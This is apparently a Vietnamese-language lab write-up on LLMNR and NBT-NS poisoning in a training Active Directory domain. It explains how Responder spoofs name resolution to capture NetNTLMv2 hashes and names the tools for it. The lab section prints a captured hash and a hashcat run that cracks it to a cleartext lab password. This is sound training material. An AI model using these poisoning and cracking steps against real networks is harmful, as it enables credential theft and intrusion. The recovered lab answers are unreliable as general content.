## LLMNR & NBT-NS Primer
[Link Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) và [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT NS) là các thành phần của Microsoft Windows, đóng vai trò là những phương thức thay thế để xác định host trong trường hợp DNS không thể phân giải tên. Khi một machine cố gắng phân giải một host nhưng DNS resolution thất bại, thông thường machine đó sẽ gửi yêu cầu tới tất cả các machine khác trên local network thông qua LLMNR để tìm kiếm địa chỉ chính xác của host. LLMNR dựa trên định dạng của Domain Name System (DNS) và cho phép các host trên cùng một local link  thực hiện name resolution đối với các host khác. Theo mặc định, LLMNR sử dụng port `5355` trêm UDP. Nếu LLMNR thất bại, NBT NS sẽ được sử dụng. NBT NS xác định các system trên local network thông qua NetBIOS name. NBT NS sử dụng port `137` trên UDP.
Điểm đáng chú ý ở đây là khi LLMNR/NBT NS được sử dụng cho quá trình name resolution, bất kỳ host nào trên network cũng có thể gửi phản hồi. Đây chính là nơi chúng ta sử dụng `Responder` để poison các request này. Với network access, chúng ta có thể giả mạo một authoritative name resolution source, trong trường hợp này là một host được cho là thuộc về network segment, trong broadcast domain bằng cách phản hồi các traffic LLMNR và NBT NS như thể hệ thống của chúng ta biết câu trả lời mà máy victim đang yêu cầu. Hoạt động poisoning này nhằm khiến victim giao tiếp với system của chúng ta bằng cách giả mạo rằng rogue system của chúng ta biết vị trí của host mà victim đang tìm kiếm. Nếu host được yêu cầu cần thực hiện name resolution hoặc authentication, chúng ta có thể capture NetNTLM hash và tiến hành một offline brute force attack nhằm cố gắng khôi phục cleartext password, Authentication request được capture cũng có thể được relay để truy cập vào một host khác hoặc được sử dụng với một protocol khác, chẳng hạn như LDAP, trên chính host đó. LLMNR/NBT NS spoofing kết hợp với việc SMB signing không được triển khai có thể thường dẫn đến administrative access trên các host trong domain. 
### Quick Example LLMNR/NBT-NS Poisoning
Hãy cùng xem xét nhanh một ví dụ về attack flow ở mức độ khái quát:
1. Một host cố gắng kết nối tới print server tại `\\print01.inlanefreight.local`, nhưng vô tình nhập thành `\\printer01.inlanefreight.local`.
2. DNS server phản hồi rằng host này không tồn tại. 
3. Sau đó, host sẽ broadcast tới toàn bộ local network để hỏi xem có machine nào biết vị trí của `\\printer01.inlanefreight.local` hay không.
4. Attacker, chúng ta với `Responder` đang hoạt động, phản hồi lại host và cho viết rằng system của chúng ta chính là `\\printer01.inlanefreight.local` mà host đang tìm kiếm.
5. Host tin tưởng phản hồi này và gửi một authentication request tới attacker, trong đó chứa username và NTLMv2 password hash.
6. Hash này sau đó có thể được crack online hoặc sử dụng trong một SMB Relay attack nếu các điều kiện cần thiết tồn tại.
## TTPs
Trong quá trình thực hiện, mục tiêu của chúng ta là thu thập authentication information được truyền qua network dưới dạng NTLMv1 và NTLMv2 password hashes. NTLMv1 và NTLMv2 là các authentication protocol sử dụng LM hoặc NT hash. Sau đó, chúng ta sẽ lấy hash và cố gắng crack chúng offline bằng các công cụ như Hashcat hoặc John với mục tiêu thu được cleartext password của account. Credentials này có thể được sử dụng để tạo initial foothold hoặc mở rộng quyền truy cập trong domain nếu password hash thu được thuộc về một account có privileges cao hơn account mà chúng ta hiện đang sở hữu.
Có một số công cụ có thể được sử dụng để thực hiện LLMNR & NBT NS poisoning:

| **Tool**                                              | **Description**                                                                                                                     |
| ----------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| [Responder](https://github.com/lgandx/Responder)      | Responder là một công cụ chuyên dụng được xây dựng nhằm poison LLMNR, NBT NS và MDNS, đồng thời cung cấp nhiều chức năng khác nhau. |
| [Inveigh](https://github.com/Kevin-Robertson/Inveigh) | Inveigh là một nền tảng MITM đa nền tảng có khả năng thực hiện các hoạt động spoofing và poisoning.                                 |
| [Metasploit](https://www.metasploit.com/)             | Metasploit cung cấp một số scanner và spoofing module được tích hợp sẵn nhằm xử lý các poisoning attack.                            |

Cả hai công cụ `Responder` và `Inveigh` đều có thể được sử dụng để tấn công các protocol sau: LLMNR, DNS, MDNS, NBNS, DHCP, ICMP, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth. Responder cũng hỗ trợ: MSSQL, DCE RPC, FTP, POP3, IMAP, và SMTP auth.

### Lab
Đầu tiên truy cập vào máy kali được cung cấp bằng ssh.
![[Pasted image 20260906005031.png]]
Tiếp theo mình thực hiện kiểm tra network interface thông qua lệnh `ip a`, kết quả thu được như trong ảnh dưới đây.
![[Pasted image 20260906005116.png]]
Ta thấy có `ens224` với `inet 172.16.5.225` và mình sử dụng card mạng ens224 để `Responder` lắng nghe traffic.
![[Pasted image 20260906005408.png]]

![[Pasted image 20260906005431.png]]

![[Pasted image 20260906005449.png]]

![[Pasted image 20260906005501.png]]
Như những gì mình thu thập được thì Question 1:
![[Pasted image 20260906005533.png]]

Tiếp theo mình sử dụng hashcat để crack để lấy mật khẩu của `backupagent`:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nano hash.txt                                                              
┌──(kali㉿kali)-[~/Desktop]
└─$ cat hash.txt 
backupagent::INLANEFREIGHT:51b278f15b8780d2:329E271910E443A6A7976F0BE56B1CDA:0101000000000000805BB8FD3D3DDD0134338F185D45E09700000000020008005A0057004B00500001001E00570049004E002D005800330049003500360051004400580042005A00580004003400570049004E002D005800330049003500360051004400580042005A0058002E005A0057004B0050002E004C004F00430041004C00030014005A0057004B0050002E004C004F00430041004C00050014005A0057004B0050002E004C004F00430041004C0007000800805BB8FD3D3DDD010600040002000000080030003000000000000000000000000030000062E21AEBA9A42402752FCCCFCE3CAF4BFF240508BCDC388118B03AB6835A42500A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000   
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i3-10105 CPU @ 3.70GHz, 1455/2911 MB (1455 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2442 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

BACKUPAGENT::INLANEFREIGHT:51b278f15b8780d2:329e271910e443a6a7976f0be56b1cda:0101000000000000805bb8fd3d3ddd0134338f185d45e09700000000020008005a0057004b00500001001e00570049004e002d005800330049003500360051004400580042005a00580004003400570049004e002d005800330049003500360051004400580042005a0058002e005a0057004b0050002e004c004f00430041004c00030014005a0057004b0050002e004c004f00430041004c00050014005a0057004b0050002e004c004f00430041004c0007000800805bb8fd3d3ddd010600040002000000080030003000000000000000000000000030000062e21aeba9a42402752fcccfce3caf4bff240508bcdc388118b03ab6835a42500a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: BACKUPAGENT::INLANEFREIGHT:51b278f15b8780d2:329e271...000000
Time.Started.....: Sat Sep  5 13:56:55 2026 (7 secs)
Time.Estimated...: Sat Sep  5 13:57:02 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1280.3 kH/s (1.62ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7733248/14344385 (53.91%)
Rejected.........: 0/7733248 (0.00%)
Restore.Point....: 7729152/14344385 (53.88%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: h4z0003159 -> h101814
Hardware.Mon.#01.: Util: 66%

Started: Sat Sep  5 13:56:48 2026
Stopped: Sat Sep  5 13:57:04 2026
```
![[Pasted image 20260906005839.png]]

![[Pasted image 20260906005907.png]]
Đây là NTLMv2-SSP Hash thu được từ Responder đối với user wley, làm tương tự question 2 để lấy mật khẩu:
![[Pasted image 20260906005953.png]]